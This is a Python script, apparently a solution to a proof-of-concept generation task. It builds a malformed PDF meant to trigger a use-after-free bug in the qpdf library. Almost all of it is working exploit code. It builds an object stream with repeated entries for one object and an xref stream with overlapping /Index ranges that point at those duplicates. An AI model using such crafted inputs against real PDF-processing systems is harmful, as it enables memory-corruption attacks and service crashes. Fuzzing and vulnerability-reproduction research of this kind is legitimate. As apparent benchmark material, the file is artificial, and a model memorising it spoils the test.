import os
import tarfile
from typing import Dict, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        # PoC PDF with:
        # - object stream containing multiple entries for the same object id (7)
        # - xref stream with overlapping /Index that provides multiple xref entries for the same object id (7)
        # This aims to trigger qpdf's preserveObjectStreams/getCompressibleObjSet bug.

        def make_obj(objnum: int, body: bytes) -> bytes:
            return (f"{objnum} 0 obj\n".encode("ascii") + body + b"\nendobj\n")

        def make_stream_obj(objnum: int, dict_body: bytes, stream_data: bytes) -> bytes:
            return (
                f"{objnum} 0 obj\n".encode("ascii")
                + dict_body
                + b"\nstream\n"
                + stream_data
                + b"\nendstream\nendobj\n"
            )

        def xref_entry(t: int, f2: int, f3: int) -> bytes:
            return bytes([t]) + int(f2).to_bytes(4, "big", signed=False) + int(f3).to_bytes(2, "big", signed=False)

        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

        parts: List[bytes] = [header]
        offsets: Dict[int, int] = {}

        # 1: Catalog (references objects 7 and 8 to ensure they're reachable)
        obj1 = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R /ViewerPreferences 8 0 R >>"
        offsets[1] = sum(len(p) for p in parts)
        parts.append(make_obj(1, obj1))

        # 2: Pages
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        offsets[2] = sum(len(p) for p in parts)
        parts.append(make_obj(2, obj2))

        # 3: Page
        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << >> >>"
        offsets[3] = sum(len(p) for p in parts)
        parts.append(make_obj(3, obj3))

        # 4: Contents stream
        content = b"0 0 m 100 100 l S\n"
        obj4_dict = b"<< /Length " + str(len(content)).encode("ascii") + b" >>"
        offsets[4] = sum(len(p) for p in parts)
        parts.append(make_stream_obj(4, obj4_dict, content))

        # 5: Info
        obj5 = b"<< /Producer (poc) /Title (uaf) >>"
        offsets[5] = sum(len(p) for p in parts)
        parts.append(make_obj(5, obj5))

        # 6: Object stream containing multiple entries for obj 7 and repeated obj 8 as filler.
        # Build many objects inside stream: alternating 7 and 8 with many duplicates.
        # Indices for obj 7: 0,2,4,...,20 (11 occurrences)
        # Indices for obj 8: 1,3,5,...,21 (11 occurrences)
        embedded_objs: List[Tuple[int, bytes]] = []
        for j in range(11):
            embedded_objs.append((7, (b"<< /S /Named /N /Print /K " + str(j).encode("ascii") + b" >>")))
            embedded_objs.append((8, (b"<< /HideToolbar true /V " + str(j).encode("ascii") + b" >>")))

        objdata_chunks: List[bytes] = []
        obj_offsets: List[int] = []
        cur = 0
        for i, (_on, ob) in enumerate(embedded_objs):
            obj_offsets.append(cur)
            objdata_chunks.append(ob)
            if i != len(embedded_objs) - 1:
                objdata_chunks.append(b" ")
                cur += len(ob) + 1
            else:
                cur += len(ob)
        objdata = b"".join(objdata_chunks)

        index_tokens: List[bytes] = []
        for i, (on, _ob) in enumerate(embedded_objs):
            index_tokens.append(str(on).encode("ascii"))
            index_tokens.append(str(obj_offsets[i]).encode("ascii"))
        index_str = b" ".join(index_tokens)

        objstm_stream = index_str + b" " + objdata
        first = len(index_str) + 1

        obj6_dict = (
            b"<< /Type /ObjStm /N "
            + str(len(embedded_objs)).encode("ascii")
            + b" /First "
            + str(first).encode("ascii")
            + b" /Length "
            + str(len(objstm_stream)).encode("ascii")
            + b" >>"
        )
        offsets[6] = sum(len(p) for p in parts)
        parts.append(make_stream_obj(6, obj6_dict, objstm_stream))

        # 7: Uncompressed object 7 (conflicts with compressed versions via overlapping xref /Index)
        # Exists to increase chances of multiple cache entries / confusing state.
        obj7_uncompressed = b"<< /Uncompressed true /Note (also defined in ObjStm) >>"
        offsets[7] = sum(len(p) for p in parts)
        parts.append(make_obj(7, obj7_uncompressed))

        # 8: No top-level object 8; it's compressed in object stream.
        # 9: XRef stream (built after we know offset)
        xref_objnum = 9
        xref_offset = sum(len(p) for p in parts)
        offsets[9] = xref_offset

        # XRef stream parameters
        size = 10  # objects 0..9
        w = (1, 4, 2)

        # Create many duplicate xref entries for object 7 using overlapping /Index
        dup_count = 10  # additional entries for object 7 beyond the one in main range
        # Choose indices for these duplicates pointing to different occurrences of obj 7 in the object stream
        # object stream indices where obj 7 occurs: 0,2,4,...,20
        seven_indices = [2 * i for i in range(11)]  # 0..20 even
        # We'll use indices 2,4,...,20 for duplicates (skip 0 which main range uses)
        dup_indices = seven_indices[1:1 + dup_count]

        index_pairs: List[int] = [0, size]
        for _ in range(dup_count):
            index_pairs.extend([7, 1])

        # Build xref entries in /Index order
        entries: List[bytes] = []
        # First range: 0..9
        for objn in range(0, size):
            if objn == 0:
                entries.append(xref_entry(0, 0, 65535))
            elif objn in (1, 2, 3, 4, 5, 6, 7, 9):
                # Object 8 is compressed; object 7 is initially uncompressed in main range
                off = offsets.get(objn, 0)
                entries.append(xref_entry(1, off, 0))
            elif objn == 8:
                # compressed in object stream 6 at index 1 (first obj 8)
                entries.append(xref_entry(2, 6, 1))
            else:
                entries.append(xref_entry(0, 0, 65535))

        # Extra duplicate entries for object 7 (compressed in object stream 6)
        for idx in dup_indices:
            entries.append(xref_entry(2, 6, idx))

        xref_data = b"".join(entries)

        xref_dict = (
            b"<< /Type /XRef"
            b" /Size " + str(size).encode("ascii") +
            b" /Root 1 0 R"
            b" /Info 5 0 R"
            b" /W [1 4 2]"
            b" /Index [" + b" ".join(str(x).encode("ascii") for x in index_pairs) + b"]"
            b" /Length " + str(len(xref_data)).encode("ascii") +
            b" >>"
        )

        parts.append(make_stream_obj(xref_objnum, xref_dict, xref_data))

        # startxref and EOF
        parts.append(b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n")

        return b"".join(parts)